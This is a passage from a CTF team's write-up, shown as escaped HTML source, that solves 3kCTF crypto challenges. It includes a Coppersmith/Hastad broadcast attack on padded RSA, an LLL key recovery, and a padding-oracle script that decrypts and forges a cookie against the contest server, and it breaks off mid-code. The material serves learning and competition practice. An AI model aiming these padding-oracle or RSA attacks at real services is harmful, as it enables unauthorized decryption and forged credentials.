  draw &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ImageDraw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Draw(im)
  
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; id1, id2, _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; edges:
    x1, y1 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; point_map&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(id1)
    x2, y2 &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; point_map&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(id2)
    draw&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;line((x1, y1, x2, y2), fill&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)

  im&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;save(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;flag.png&amp;#39;&lt;/span&gt;)

main()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://i.imgur.com/MNaoisT.png&#34; alt=&#34;&#34;&gt;&lt;/figure&gt;&lt;/p&gt;

&lt;p&gt;Flag: &lt;code&gt;3K-PYZZLE_FO_SHIZZLE_MY_NIZZLE&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;a-hundred-friends-crypto-496-points&#34;&gt;A hundred friends (Crypto; 496 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; RSA&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;generate(&lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt;)
pad &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;randint(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;UPPER_BOUND)
exp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;randint(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)
c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pow(m&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;exp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; pad, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, key&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;n)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;This is a challenge similar to Multicast in PlaidCTF 2017.
Theoretically, we should be able to recover the original message with 3 ciphertexts, assuming that those ciphertexts are encrypted with &lt;code&gt;exp = 1&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;We have written the core logic to retrieve the message, given some ciphertexts:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;attempt&lt;/span&gt;(subpairs):
  n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; len(subpairs)

  &lt;span style=&#34;color:#75715e&#34;&gt;# (m + pi)^3 = ci (mod ni)&lt;/span&gt;
  cs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list(map(&lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; pair: pair[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], subpairs))
  ns &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list(map(&lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; pair: pair[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], subpairs))
  ps &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list(map(&lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; pair: pair[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], subpairs))
  nprod &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; reduce(mul, ns)

  gs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(n)] &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)]
  &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(n):
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;):
      gs[j][i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; binomial(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, j) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; pow(ps[i], j, nprod) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; ns[i]
    gs[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;][i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ((gs[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;][i] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; cs[i]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; ns[i] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; ns[i]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; ns[i]

  gg &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [int(crt(gs[i], ns)) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)]
  
  &lt;span style=&#34;color:#75715e&#34;&gt;# Defines e, Zn = Zmod(nprod) and the parameters for the&lt;/span&gt;
  &lt;span style=&#34;color:#75715e&#34;&gt;# Coppersmith&amp;#39;s attack here. Omitted&lt;/span&gt;

  roots &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; coppersmith_howgrave_univariate(pol, nprod, beta, mm, tt, XX)
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; len(roots) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; roots[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;(Some functions are copied from &lt;a href=&#34;https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/coppersmith.sage&#34;&gt;mimoo/RSA-and-LLL-attacks&lt;/a&gt;. They are not included here for simplicity)&lt;/p&gt;

&lt;p&gt;However, we are unable to recover the message from sampling three ciphertexts in 100 rounds (it should happen in around 27 rounds). The reason is the message isn&#39;t small enough for Coppersmith&#39;s attack. Hence, we are sampling more ciphertexts (from 3 to 5) and the attack worked:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;n &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;
attempt_count &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; True:
  random&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;shuffle(pairs)
  subpairs &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pairs[:n]
  attempt_count &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; attempt_count &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Attempt {attempt_count}&amp;#39;&lt;/span&gt;)

  m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; attempt(subpairs)
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; m &lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt; None: &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;
  m &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; int(m)
  flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; m&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;to_bytes(length&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;(m&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;bit_length() &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, byteorder&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;big&amp;#39;&lt;/span&gt;)
  &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(subpairs)
  &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(flag)
  &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;

&lt;span style=&#34;color:#75715e&#34;&gt;# b&amp;#39;3k{H4st4d_St1ll_Rul3S}AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&amp;#39;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Note that there is a chance to return &lt;code&gt;m^2&lt;/code&gt; or &lt;code&gt;m^3&lt;/code&gt;. As I am lazy, I just run the script again until it returns &lt;code&gt;m&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;rsa-textbook-crypto-496-points&#34;&gt;RSA textbook (Crypto; 496 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;This challenge is similar to De1CTF&#39;s easyRSA. By reading the same reference paper &lt;a href=&#34;https://link.springer.com/chapter/10.1007/3-540-46701-7_14&#34;&gt;[Howgrave-Graham 1999]&lt;/a&gt;, we have the matrix in session 3.3. By using the matrix directly and perform LLL, we can recover &lt;code&gt;d1&lt;/code&gt; (the private key that corresponds to &lt;code&gt;e1&lt;/code&gt;). We can then recover &lt;code&gt;phi(n)&lt;/code&gt; and thus compute &lt;code&gt;d&lt;/code&gt; (that corresponds to &lt;code&gt;e&lt;/code&gt;), hence decrypting the ciphertext: &lt;code&gt;3k{hOwGr4v3_gr4h4m_and_s31F3rt_4re_C00l}AAAAAAAAAAAAAAAAAAAA&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&#34;you-shall-not-get-my-cookies-crypto-495-points&#34;&gt;You shall not get my cookies (Crypto; 495 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;This is a standard padding oracle attack.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;connect&lt;/span&gt;():
  HOST &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;youshallnotgetmycookies.3k.ctf.to&amp;#39;&lt;/span&gt;
  PORT &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13337&lt;/span&gt;

  &lt;span style=&#34;color:#66d9ef&#34;&gt;global&lt;/span&gt; debug
  &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; debug:
    context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;debug&amp;#39;&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
    context&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;log_level &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;error&amp;#39;&lt;/span&gt;

  r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; remote(HOST, PORT)
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; r

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;oracle&lt;/span&gt;(ciphertext):
  r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; connect()
  payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; binascii&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hexlify(ciphertext)
  r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;~ So... whats your cookie:&amp;#39;&lt;/span&gt;, payload)
  r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvuntil(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;~ &amp;#39;&lt;/span&gt;)
  res &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recvline()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;strip()
  r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;close()
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; res &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;That cookie looks burned!&amp;#39;&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;():
  ciphertext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; binascii&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unhexlify(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;90C560B2A01529EF986E54B016E1FEAAD79A54BE52B373311E3B4F8251BE269EC199AE6B370BFCE50A54EEC25ABB0F22&amp;#39;&lt;/span&gt;)

  po &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; PaddingOracle(oracle, threads&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;)

  plaintext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; po&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;recover(ciphertext)
  &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(plaintext) &lt;span style=&#34;color:#75715e&#34;&gt;# b&amp;#39; chocolate chip cookie\n\n\n\n\n\n\n\n\n\n&amp;#39;&lt;/span&gt;

  ciphertext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; po&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;forge(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Maple Oatmeal Biscuits&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x0a&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;)

  r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; connect()
  r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sendlineafter(&lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;~ So... whats your cookie:&amp;#39;&lt;/span&gt;, binascii&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;hexlify(ciphertext))
  r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;interactive()
  &lt;span style=&#34;color:#75715e&#34;&gt;# ~ YES, that is exactly what i wanted!&lt;/span&gt;
  &lt;span style=&#34;color:#75715e&#34;&gt;# ~ Take it! 3k{Y3t_An0th3r_Padd1ng_Oracle}&lt;/span&gt;
  
main()&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;h2 id=&#34;once-upon-a-time-crypto-492-points&#34;&gt;once upon a time (Crypto; 492 points)&lt;/h2&gt;

&lt;p&gt;Solved by &lt;em&gt;Mystiz&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;With a bit of code review, it is running a block cipher with block size = 1 (Source: the &lt;code&gt;encrypt_file&lt;/code&gt; method in &lt;code&gt;/src/cipher.c&lt;/code&gt;). The key is also redacted from the source (Source: &lt;code&gt;/src/main.c&lt;/code&gt;). Moreover, surprisingly, the key is &lt;em&gt;not&lt;/em&gt; redacted from the binary.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)v45      &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v45[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;]  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v45[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v45[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(_QWORD &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;v45[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt;x01&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;But if you think I am going to reverse the algorithm, you are wrong. I&#39;m just using the binary as an encryption oracle.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;encrypt&lt;/span&gt;(plaintext, mode):
